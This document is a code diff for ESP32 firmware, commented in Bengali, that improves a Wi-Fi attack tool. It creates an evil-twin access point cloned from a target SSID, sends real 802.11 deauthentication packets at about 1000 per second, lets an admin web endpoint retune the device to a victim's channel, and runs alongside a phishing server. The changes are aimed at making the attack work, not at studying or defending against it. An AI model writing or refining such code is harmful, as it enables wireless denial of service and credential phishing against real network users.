@@ -853,12 +853,11 @@ void scanNetworks() {
 void createEvilTwinAP(String ssid, String password, int channel) {
     Serial.println("\n[EVIL TWIN] Creating Evil Twin AP...");
     
-    // আগের AP বন্ধ করবেন না - Admin connection রাখার জন্য
-    // শুধু SSID পরিবর্তন করুন (Admin এখনও IP দিয়ে access করতে পারবে)
-    WiFi.softAPdisconnect(false); // false = disconnect clients but keep AP
+    // AP reconfigure করুন (বন্ধ না করে)
+    // এতে existing connections maintain হবে
     delay(100);
     
-    // Evil Twin AP তৈরি করুন (একই IP range)
+    // Evil Twin AP তৈরি করুন (target SSID দিয়ে)
     bool success = WiFi.softAP(ssid.c_str(), password.c_str(), channel, 0, 8);
     
     if(success) {
@@ -938,21 +937,28 @@ void sendDeauthPacket() {
     
     // Parse BSSID string to bytes
     uint8_t bssid[6];
-    sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+    if(sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]) != 6) {
+        Serial.println("[DEAUTH] ❌ Invalid BSSID format!");
+        return;
+    }
     
     // Set BSSID in deauth packet (source and BSSID fields)
     memcpy(&deauthPacket[10], bssid, 6);
     memcpy(&deauthPacket[16], bssid, 6);
     
-    // Send deauth packet
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    // Send deauth packet using AP interface
+    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
     
-    deauthPacketsSent++;
-    
-    if(deauthPacketsSent % 50 == 0) {
-        Serial.printf("[DEAUTH] 💥 Sent %d packets to %s [%s]\n", 
-                     deauthPacketsSent, targetSSID.c_str(), targetBSSID.c_str());
+    if(result == ESP_OK) {
+        deauthPacketsSent++;
+        
+        if(deauthPacketsSent % 100 == 0) {
+            Serial.printf("[DEAUTH] 💥 Sent %d packets to %s [%s]\n", 
+                         deauthPacketsSent, targetSSID.c_str(), targetBSSID.c_str());
+        }
+    } else if(deauthPacketsSent == 0) {
+        Serial.printf("[DEAUTH] ⚠️ First packet failed: %d\n", result);
     }
 }
 
@@ -1017,9 +1023,16 @@ void setupAdminServer() {
         targetBSSID = adminServer.arg("bssid");
         targetChannel = adminServer.arg("channel").toInt();
         
-        // Set WiFi channel for deauth
+        // Enable promiscuous mode for packet injection
         esp_wifi_set_promiscuous(true);
-        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+        
+        // Change AP channel to target channel
+        wifi_config_t conf;
+        esp_wifi_get_config(WIFI_IF_AP, &conf);
+        conf.ap.channel = targetChannel;
+        esp_wifi_set_config(WIFI_IF_AP, &conf);
+        
+        delay(100);
         
         isDeauthActive = true;
         deauthStartTime = millis();
@@ -1032,14 +1045,22 @@ void setupAdminServer() {
         Serial.printf("  Target: %s\n", targetSSID.c_str());
         Serial.printf("  BSSID: %s\n", targetBSSID.c_str());
         Serial.printf("  Channel: %d\n", targetChannel);
+        Serial.println("  Mode: Real 802.11 deauth packets");
     });
     
     // Deauth বন্ধ
     adminServer.on("/stopDeauth", HTTP_GET, []() {
         isDeauthActive = false;
         esp_wifi_set_promiscuous(false);
+        
+        // Restore original AP channel if needed
+        wifi_config_t conf;
+        esp_wifi_get_config(WIFI_IF_AP, &conf);
+        conf.ap.channel = 1; // Default channel
+        esp_wifi_set_config(WIFI_IF_AP, &conf);
+        
         adminServer.send(200, "application/json", "{\"success\":true}");
-        Serial.printf("\n[DEAUTH] Attack stopped. Total packets sent: %d\n", deauthPacketsSent);
+        Serial.printf("\n[DEAUTH] ✅ Attack stopped. Total packets sent: %d\n", deauthPacketsSent);
     });
     
     // Evil Twin তৈরি
@@ -1169,9 +1190,9 @@ void loop() {
         phishingServer.handleClient();
     }
     
-    // Deauth অ্যাটাক (প্রতি 10ms এ 5টি packet)
+    // Deauth অ্যাটাক (প্রতি 5ms এ 5টি packet = 1000 packets/sec)
     static unsigned long lastDeauth = 0;
-    if(isDeauthActive && millis() - lastDeauth > 10) {
+    if(isDeauthActive && millis() - lastDeauth > 5) {
         simulateDeauthAttack();
         lastDeauth = millis();
     }
